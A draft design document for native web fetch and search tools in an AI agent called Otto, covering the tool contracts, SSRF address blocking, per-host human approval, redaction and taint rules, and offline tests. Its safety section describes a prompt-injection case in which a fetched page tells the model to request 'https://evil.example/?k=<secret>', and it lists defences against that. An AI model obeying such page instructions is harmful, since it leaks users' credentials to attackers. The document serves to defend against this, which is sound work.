# Web fetch and search tools

Status: draft for approval. No production code or tests are written until the
open questions at the end are answered.
Source baseline: the `main` checkout on 2026-10-04.

## Problem

Otto has no native way to read a web page. The built-in tools are workspace
file tools, `bash`, memory, sub-agent, MCP and approval tools. When a model
needs a URL it writes `curl` through `bash`, which has these problems:

- It returns raw HTML. Markup and scripts waste tokens and bury the content.
- There is no body cap, content-type handling, redirect policy or timeout, so
  each call re-invents them, and a large body is truncated blindly.
- Approval and reflection see an opaque shell command. `reflection::taint`
  guesses "network" from the command text and misses scripts.
- It needs `bash`, so it is unavailable on Linux without `--sandbox off`, and
  unavailable whenever `[sandbox].network = "deny"`, even for a user who wants
  reading but not arbitrary processes.

## Goal

Add two native tools to `crates/otto`:

- `web_fetch`: GET one `http`/`https` URL and return its readable text.
- `web_search`: return a ranked list of title, URL and snippet for a query.

Both are on by default. `web_search` needs a search API key from an
environment variable; it is registered when the key is present and skipped
otherwise, as the change rules require. `web_fetch` needs no input.

Non-goals: browser automation, JavaScript execution, login or cookie
sessions, PDF/image/binary extraction, POST or any non-GET method, downloading
files into the workspace, a secondary summarising model.

## Ownership and dependencies

New module `crates/otto/src/tool/web/`, one-way dependencies:

| File | Owns |
| --- | --- |
| `mod.rs` | `WebFetch` and `WebSearch` `Tool` impls, argument parsing, result shaping |
| `policy.rs` | URL validation, address classification, redirect rules, per-host grant lookup |
| `client.rs` | The `reqwest` client, resolver, streaming body read with caps |
| `extract.rs` | HTML to Markdown/text, charset handling, truncation and offsets |
| `search.rs` | The search backend request and response mapping |

`otto-core` is unchanged: it must stay wasm-safe, and `reqwest`, DNS and socket
policy are native concerns. The tools are constructed at the composition root
in `cli` and passed into `Registry` like the other native tools. They read the
sandbox `network` mode and the approval service by injection, not through
globals. `reqwest` is already a workspace dependency, so the only candidate new
dependency is an HTML-to-text crate (open question 3).

## `web_fetch` contract

Arguments (strict schema, `additionalProperties: false`):

| Name | Type | Meaning |
| --- | --- | --- |
| `url` | string, required | Absolute `http` or `https` URL, at most 2048 bytes, no userinfo |
| `offset` | integer, optional | Character offset into the extracted text, to read past a truncated page |
| `limit` | integer, optional | Maximum characters to return, clamped to the tool output cap |

There is no `prompt` argument and no inner model. The result is the extracted
text, which the calling model reads itself. This keeps the tool deterministic,
cheap and offline-testable, and avoids a second model that would see attacker
text. Optional list arguments are not used, so `empty_as_none` does not apply.

Result, in band as text: a header line (final URL after redirects, HTTP status,
content type, extracted length, and `truncated; next offset N` when cut),
then the body. Failures are in-band error results (`preflight_error` before any
request leaves the process). The output is capped at the existing 51200-byte
tool cap.

Processing:

1. Parse and validate the URL (see Safety). Upgrade nothing silently: `http`
   is allowed, but a redirect from `https` to `http` is refused.
2. GET with `Accept: text/html, text/markdown, text/plain, application/json;q=0.9, */*;q=0.1`,
   a fixed `User-Agent: otto/<version>`, no cookies, no `Authorization`, no
   credentials of any kind.
3. Follow redirects manually, at most 5. Every hop passes the full policy
   again, including approval for a new host (see Approval).
4. Stream the body and stop at 2 MiB (response is then marked truncated).
   Total timeout 30 s, connect timeout 10 s. Cancellation drops the stream.
5. Dispatch on `Content-Type`: `text/html` and `application/xhtml+xml` go
   through extraction; `text/*`, `application/json`, `application/xml` and
   `+json`/`+xml` types are returned as text; anything else (images, PDF,
   archives, octet-stream) returns an error naming the type. Charset comes from
   the header, then a `<meta>` tag, then UTF-8 with replacement.
6. Extraction removes `script`, `style`, `noscript`, `svg`, `template`, hidden
   elements, comments and, when a `main` or `article` element exists, content
   outside it. It keeps headings, lists, tables, links (`[text](absolute-url)`),
   code blocks and emphasis. No readability scoring in v1.

Pages that need JavaScript return what the server sent; the header says
`js-rendered pages may be incomplete` when extracted text is under a small
threshold and the page contains scripts.

## `web_search` contract

Arguments: `query` (string, required, at most 400 characters), `count`
(integer, optional, default 8, maximum 20).

The result is a numbered list of title, URL and snippet. The tool performs one
HTTPS request to the configured search backend and does not follow result
links. Reading a result is a separate `web_fetch` call, which is subject to its
own approval.

Backend: one HTTP JSON search API, selected at build time, with the key read
from an environment variable and never placed in config, logs, results or
approval details. The request goes through the same client, timeout, size cap
and cancellation rules as `web_fetch`. See open question 1 for the backend.

Provider-native search (for the `chatgpt` Responses API) is not used: it is not
available on arbitrary `openai-compatible` endpoints and would fork behaviour
by provider.

## Safety

The sandbox constrains `bash` children, not the Otto process. An in-process
HTTP client bypasses Seatbelt, so the tool must enforce its own boundary.

**Network mode.** If `[sandbox].network = "deny"`, both tools fail before any
request with a message naming that setting. `/sandbox network allow` and
`/sandbox reload` take effect on the next call, because the mode is read per
call from the controller, not captured at startup.

**SSRF.** Only `http` and `https` are accepted. Resolution uses a custom
resolver that classifies every resolved address and rejects loopback,
unspecified, private (RFC 1918, ULA), link-local (including `169.254.169.254`
and `fe80::/10`), CGNAT, multicast, broadcast and IPv4-mapped forms of these. The
check runs at connect time on the address actually dialled, so DNS rebinding
between check and connect does not help. Literal IP hosts get the same check.
Redirect targets are re-validated per hop. Environment proxy variables are
ignored so the address check cannot be bypassed by a proxy.

**Exfiltration and injection.** A fetched page is attacker-controlled input,
and a URL is an output channel: a compromised page can ask the model to fetch
`https://evil.example/?k=<secret>`. Mitigations:

- URLs and search queries are checked with the existing redaction; a value that
  would change under redaction (a credential or token pattern) is refused with
  an in-band error, as the MCP adapter does for its approval details.
- First use of a host needs human approval (next section), so the user sees the
  host before any bytes are sent to it.
- Results begin with the fixed header and, for `web_fetch`, a one-line notice
  that the content is untrusted and its instructions are not the user's. This
  is advisory, not a boundary.
- `reflection::taint` treats `web_fetch` and `web_search` results as external,
  like MCP results, so they are never shown to the reflection model or cited as
  evidence. The same guard is added for memory proposals made in a turn that
  read web content where the existing taint logic already applies.

**Secrets.** No credentials are sent. The search key comes only from the
environment and is excluded from tool results and error text.

## Approval

Reading public pages should not prompt on every call, but a new destination
should be visible to the user. The tools use the existing unified approval
service through `Tool::approval_spec`, with `source = "web"`:

- The subject is the exact scheme, host and port (not the full URL). Details
  show the URL being requested; the version is the digest of host and port.
- A host the user has already allowed (this session, or persistently) needs no
  prompt. A persistent choice adds the host to `[web].allow_hosts` through the
  same backed-up config writer used for `read_paths`, with a versioned preview.
- Redirect hops to an unapproved host raise a new request at that hop; refusal
  ends the call with the hop URL in the error.
- `web_search` is approved once per backend host and does not prompt per
  query, because the destination is fixed and the user configured the key.
- Sub-agents and scheduled runs use the same service. Requests from a child
  identify the originating task and are decided by a human, never by the
  parent, as the unified approval contract already requires. A unattended run
  with no available frontend waits or fails according to the existing
  wait policy; it never auto-allows.

This is a safety control on destinations, not a default-off feature gate: both
tools are enabled out of the box.

## Frontends and recording

- ACP: `tool_kind` maps `web_fetch` to `fetch` and `web_search` to `search`,
  with the URL or query as the title. The mapping table test is extended.
- TUI, Web UI and chat connectors render them through the generic tool-call
  path; approval cards use the shared approval presentation, so no
  frontend-specific code is required.
- Session history records the call and result as for any tool; it stays
  append-only and the Pi v3 codec is unchanged.
- Usage and redaction apply to results the same way as other tool output.

## Verification

All tests are offline and deterministic. The default policy refuses loopback,
so tests run a local listener behind a `cfg(test)` policy constructor that
permits loopback; production has no flag that does.

- Policy: scheme and userinfo rejection, every blocked address class including
  mapped IPv6, literal IPs, redirect to a private address, redirect from https
  to http, redirect limit, rebinding via a resolver stub that changes answers.
- Client: body cap, timeout, cancellation mid-stream, charset detection,
  unsupported content types, no cookies or auth headers sent.
- Extraction: fixtures for script/style removal, `main`/`article` selection,
  links made absolute, tables, code blocks, offset/limit paging and the
  truncation header.
- Network mode: `deny` blocks both tools and a reload re-enables them.
- Approval: new host requests, session and persistent grants, redirect-hop
  requests, withdrawal, child-task attribution, and no prompt for an allowed
  host.
- Redaction: a credential-shaped URL or query is refused; the search key never
  appears in results or errors.
- Taint: both tools are classified external.
- Search: response mapping from a recorded fixture and a missing key leaves the
  tool unregistered.
- Contract tests: `tool_argument_contract.rs`, the tool-definition golden file,
  the ACP mapping table, and `make rust-wasm-check` unchanged.

Gates: `make check-fast` while developing, then `make check` and
`make check-linux`.

## Open questions

1. **Search backend.** Which single API: Brave Search, Tavily, Exa, Serper or
   another? Recommendation: Brave Search (plain key, stable JSON, independent
   index), with the variable named `OTTO_SEARCH_API_KEY`. Alternative: ship
   `web_fetch` first and leave search to MCP servers until a backend is chosen.
2. **Default approval policy.** Recommendation: prompt on first use of each
   host, with session and persistent grants as above. Alternative: allow any
   public host without prompting and rely on the address policy only, which is
   smoother but leaves the URL exfiltration channel open.
3. **HTML extractor.** Recommendation: add one small pure-Rust HTML-to-Markdown
   crate (for example `htmd`), pinned exactly like other workspace
   dependencies. Alternative: a minimal in-tree extractor over `html5ever`,
   which is more code to own.
4. **Sub-agents.** Should children inherit both tools by default like the file
   tools? Recommendation: yes, with the approval routing above.
5. **Scope of v1.** Recommendation: `web_fetch` and `web_search` together in
   one change. Alternative: two changes, `web_fetch` first.
